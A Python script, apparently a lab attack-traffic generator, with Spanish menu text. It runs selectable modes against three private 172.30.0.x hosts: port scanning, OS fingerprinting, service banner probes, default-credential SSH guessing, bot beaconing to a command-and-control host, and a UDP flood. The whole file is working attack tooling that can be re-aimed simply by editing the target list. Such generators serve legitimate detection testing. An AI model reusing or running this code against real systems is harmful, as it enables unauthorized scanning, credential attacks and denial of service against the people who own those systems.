import socket
import time
import random
import sys
import struct
import threading
import json
import base64
import hashlib
import string
import os

TARGETS = ["172.30.0.11", "172.30.0.12", "172.30.0.13"]
C2_HOST = "172.30.0.100"
C2_PORT = 8080
TIMEOUT = 0.5


def _connect(host, port, data=None):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((host, port))
            if data:
                s.send(data if isinstance(data, bytes) else data.encode())
        return True
    except:
        return False


def _udp_send(host, port, data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(data if isinstance(data, bytes) else data.encode(), (host, port))
    except:
        pass


# RECON

def port_scan():
    print("[RECON] port_scan")
    ports = [21,22,23,25,53,80,443,8080,8443,2323,3306,5432,6379,27017,9200,1883,5683]
    for target in TARGETS:
        for port in ports:
            try:
                with socket.socket() as s:
                    s.settimeout(0.3)
                    s.connect((target, port))
            except:
                pass


def os_fingerprint():
    print("[RECON] os_fingerprint")
    for target in TARGETS:
        for port in [80, 443, 22]:
            try:
                with socket.socket() as s:
                    s.settimeout(0.5)
                    s.connect((target, port))
                    probe = b"\x00" * random.randint(40, 1460)
                    s.send(probe)
            except:
                pass
            time.sleep(0.05)


def service_enum():
    print("[RECON] service_enum")
    probes = {
        22: b"SSH-2.0-OpenSSH_PROBE\r\n",
        80: b"HEAD / HTTP/1.0\r\n\r\n",
        21: b"USER anonymous\r\n",
        23: b"\xff\xfd\x18\xff\xfd\x20",
        25: b"EHLO probe.local\r\n",
    }
    for target in TARGETS:
        for port, probe in probes.items():
            _connect(target, port, probe)


# BRUTE FORCE

def ssh_bruteforce():
    print("[BRUTEFORCE] ssh")
    creds = [("root","root"),("admin","admin"),("root","12345")]
    for target in TARGETS:
        for u,p in creds:
            _connect(target,22,f"{u}:{p}")
            time.sleep(0.1)


# C2

def c2_beaconing():
    print("[C2] beaconing")
    bot_id = hashlib.md5(b"bot001").hexdigest()[:8]
    for i in range(10):
        payload = json.dumps({"id":bot_id,"seq":i})
        _connect(C2_HOST,C2_PORT,payload)
        time.sleep(1)


# DDOS


def udp_flood():
    print("[DDOS] udp_flood")
    target = random.choice(TARGETS)
    payload = os.urandom(512)

    for _ in range(200):
        port = random.randint(1024,65535)
        _udp_send(target, port, payload)
        time.sleep(0.005)



ATTACK_MAP = {
    "port_scan": port_scan,
    "os_fingerprint": os_fingerprint,
    "service_enum": service_enum,
    "ssh_bruteforce": ssh_bruteforce,
    "c2_beaconing": c2_beaconing,
    "udp_flood": udp_flood,
}


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "list"

    if mode == "list":
        print("Ataques:")
        for k in ATTACK_MAP:
            print(" -", k)

    elif mode in ATTACK_MAP:
        ATTACK_MAP[mode]()

    else:
        print("Ataque inválido")